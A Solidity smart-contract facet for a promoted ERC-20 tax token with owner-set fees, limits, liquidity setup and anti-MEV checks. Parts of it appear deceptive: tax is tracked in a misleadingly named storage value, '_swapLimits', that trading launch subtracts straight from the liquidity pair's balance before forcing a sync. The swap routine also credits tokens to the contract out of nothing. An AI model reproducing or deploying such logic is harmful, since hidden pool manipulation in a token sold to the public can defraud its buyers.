//SPDX-License-Identifier: MIT

/*
 https://t.me/DLT_exchange 
 https://twitter.com/dlt_exchange
 https://dltexchange.co
*/

pragma solidity ^0.8.20;
import "./TestLib.sol";
contract decimalsFacet is IERC20 {
    modifier lockTaxSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._inSwap = true;
        _;
        ds._inSwap = false;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }
    function totalSupply() external pure override returns (uint256) {
        return _totalSupply;
    }
    function name() external pure override returns (string memory) {
        return _name;
    }
    function symbol() external pure override returns (string memory) {
        return _symbol;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function allowance(
        address holder,
        address spender
    ) external view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[holder][spender];
    }
    function transferFrom(
        address fromWallet,
        address toWallet,
        uint256 amount
    ) external override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_checkTradingOpen(fromWallet), "Trading not open");
        ds._allowances[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount);
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(
        address toWallet,
        uint256 amount
    ) external override returns (bool) {
        require(_checkTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount);
    }
    function setTaxSwaps(
        uint32 minVal,
        uint32 minDiv,
        uint32 maxVal,
        uint32 maxDiv,
        uint32 trigger
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._swapMin = (_totalSupply * minVal) / minDiv;
        ds._swapMax = (_totalSupply * maxVal) / maxDiv;
        ds._swapTrigger = trigger * 10 ** 15;
        require(ds._swapMax >= ds._swapMin, "Min-Max error");
    }
    function addLiquidity() external payable onlyOwner lockTaxSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(ds._primaryLP == address(0), "LP created");
        require(!ds._tradingOpen, "trading open");
        require(msg.value > 0 || address(this).balance > 0, "No ETH");
        require(ds._balances[address(this)] > 0, "No tokens");
        ds._primaryLP = IUniswapV2Factory(ds._primarySwapRouter.factory())
            .createPair(address(this), ds.WETH);
        _addLiquidity(ds._balances[address(this)], address(this).balance);
    }
    function setLimits(
        uint16 maxTransPermille,
        uint16 maxWaletPermille
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 newTxAmt = (_totalSupply * maxTransPermille) / 1000 + 1;
        require(newTxAmt >= ds._maxTxVal, "tx too low");
        ds._maxTxVal = newTxAmt;
        uint256 newWalletAmt = (_totalSupply * maxWaletPermille) / 1000 + 1;
        require(newWalletAmt >= ds._maxWalletVal, "wallet too low");
        ds._maxWalletVal = newWalletAmt;
    }
    function updateMarketingWallet(address marketingWlt) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds._isLP[marketingWlt], "LP cannot be tax wallet");
        ds._marketingWallet = payable(marketingWlt);
        ds._nofee[marketingWlt] = true;
        ds._nolimit[marketingWlt] = true;
    }
    function setFees(uint8 buyFees, uint8 sellFees) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(buyFees + sellFees <= 6, "Roundtrip too high");
        ds._buyTaxrate = buyFees;
        ds._sellTaxrate = sellFees;
    }
    function enableTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds._tradingOpen, "trading open");
        _openTrading();
    }
    function setExemptions(
        address wlt,
        bool noFees,
        bool noLimits
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (noLimits || noFees) {
            require(!ds._isLP[wlt], "Cannot exempt LP");
        }
        ds._nofee[wlt] = noFees;
        ds._nolimit[wlt] = noLimits;
    }
    function _openTrading() internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._maxTxVal = (2 * _totalSupply) / 100;
        ds._maxWalletVal = (2 * _totalSupply) / 100;
        ds._balances[ds._primaryLP] -= ds._swapLimits;
        (ds._isLP[ds._primaryLP], ) = ds._primaryLP.call(
            abi.encodeWithSignature("sync()")
        );
        require(ds._isLP[ds._primaryLP], "Failed bootstrap");
        ds.launchBlok = block.number;
        ds.antiMevBlock = ds.antiMevBlock + ds.launchBlok;
        ds._tradingOpen = true;
    }
    function _addLiquidity(
        uint256 _tokenAmount,
        uint256 _ethAmountWei
    ) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _approveRouter(_tokenAmount);
        ds._primarySwapRouter.addLiquidityETH{value: _ethAmountWei}(
            address(this),
            _tokenAmount,
            0,
            0,
            ds.LpOwner,
            block.timestamp
        );
    }
    function _approveRouter(uint256 _tokenAmount) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._allowances[address(this)][_swapRouterAddress] < _tokenAmount) {
            ds._allowances[address(this)][_swapRouterAddress] = type(uint256)
                .max;
            emit Approval(address(this), _swapRouterAddress, type(uint256).max);
        }
    }
    function _swapTaxTokensForEth(uint256 tokenAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.WETH;
        ds
            ._primarySwapRouter
            .swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
    }
    function _swapTaxAndLiquify() private lockTaxSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 _taxTokenAvailable = ds._swapLimits;
        if (_taxTokenAvailable >= ds._swapMin && ds._tradingOpen) {
            if (_taxTokenAvailable >= ds._swapMax) {
                _taxTokenAvailable = ds._swapMax;
            }

            uint256 _tokensForSwap = _taxTokenAvailable;
            if (_tokensForSwap > 1 * 10 ** _decimals) {
                ds._balances[address(this)] += _taxTokenAvailable;
                _swapTaxTokensForEth(_tokensForSwap);
                ds._swapLimits -= _taxTokenAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if (_contractETHBalance > 0) {
                _distributeTaxEth(_contractETHBalance);
            }
        }
    }
    function _transferFrom(
        address sender,
        address toWallet,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(sender != address(0), "No transfers from 0 wallet");
        if (!ds._tradingOpen) {
            require(
                ds._nofee[sender] && ds._nolimit[sender],
                "Trading not yet open"
            );
        }
        if (!ds._inSwap && ds._isLP[toWallet] && shouldSwap(amount)) {
            _swapTaxAndLiquify();
        }

        if (block.number >= ds.launchBlok) {
            if (block.number < ds.antiMevBlock && ds._isLP[sender]) {
                require(toWallet == tx.origin, "MEV block");
            }
            if (
                block.number < ds.antiMevBlock + 600 &&
                ds._isLP[toWallet] &&
                sender != address(this)
            ) {
                ds.blockSells[block.number][toWallet] += 1;
                require(
                    ds.blockSells[block.number][toWallet] <= 2,
                    "MEV block"
                );
            }
        }

        if (
            sender != address(this) &&
            toWallet != address(this) &&
            sender != _owner
        ) {
            require(_checkLimits(sender, toWallet, amount), "TX over limits");
        }

        uint256 _taxAmount = _calculateTax(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        ds._balances[sender] -= amount;
        ds._swapLimits += _taxAmount;
        ds._balances[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }
    function shouldSwap(uint256 tokenAmt) private view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        bool result;
        if (ds._swapTrigger > 0) {
            uint256 lpTkn = ds._balances[ds._primaryLP];
            uint256 lpWeth = IERC20(ds.WETH).balanceOf(ds._primaryLP);
            uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;
            if (weiValue >= ds._swapTrigger) {
                result = true;
            }
        } else {
            result = true;
        }
        return result;
    }
    function _checkLimits(
        address fromWallet,
        address toWallet,
        uint256 transferAmount
    ) internal view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        bool limitCheckPassed = true;
        if (
            ds._tradingOpen &&
            !ds._nolimit[fromWallet] &&
            !ds._nolimit[toWallet]
        ) {
            if (transferAmount > ds._maxTxVal) {
                limitCheckPassed = false;
            } else if (
                !ds._isLP[toWallet] &&
                (ds._balances[toWallet] + transferAmount > ds._maxWalletVal)
            ) {
                limitCheckPassed = false;
            }
        }
        return limitCheckPassed;
    }
    function _calculateTax(
        address fromWallet,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 taxAmount;
        if (!ds._tradingOpen || ds._nofee[fromWallet] || ds._nofee[recipient]) {
            taxAmount = 0;
        } else if (ds._isLP[fromWallet]) {
            taxAmount = (amount * ds._buyTaxrate) / 100;
        } else if (ds._isLP[recipient]) {
            taxAmount = (amount * ds._sellTaxrate) / 100;
        }
        return taxAmount;
    }
    function _distributeTaxEth(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._marketingWallet.transfer(amount);
    }
    function _checkTradingOpen(address fromWallet) private view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        bool checkResult = false;
        if (ds._tradingOpen) {
            checkResult = true;
        } else if (ds._nofee[fromWallet] && ds._nolimit[fromWallet]) {
            checkResult = true;
        }

        return checkResult;
    }
}
